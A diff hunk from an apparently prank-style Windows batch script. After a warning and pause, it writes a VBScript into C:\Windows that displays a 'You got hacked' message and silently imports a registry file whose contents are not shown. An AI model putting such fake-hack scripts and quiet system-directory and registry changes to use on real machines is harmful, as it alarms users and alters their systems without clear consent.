@@ -26,7 +26,7 @@ echo Exit if you don't want them.
 echo.
 echo.
 pause
-echo x=msgbox("You got hacked by Uolliac. Enjoy", vbOKOnly+vbInformation, "Oh no, see message below!") > C:\Windows\haha_uolliac_hacked.vbs
+echo x=msgbox^("You got hacked by Uolliac. Enjoy", vbOKOnly+vbInformation, "Oh no, see message below!"^) > C:\Windows\haha_uolliac_hacked.vbs
 reg import trouillac.reg /f >nul
 echo.
 echo Registry settings that are required is applied.
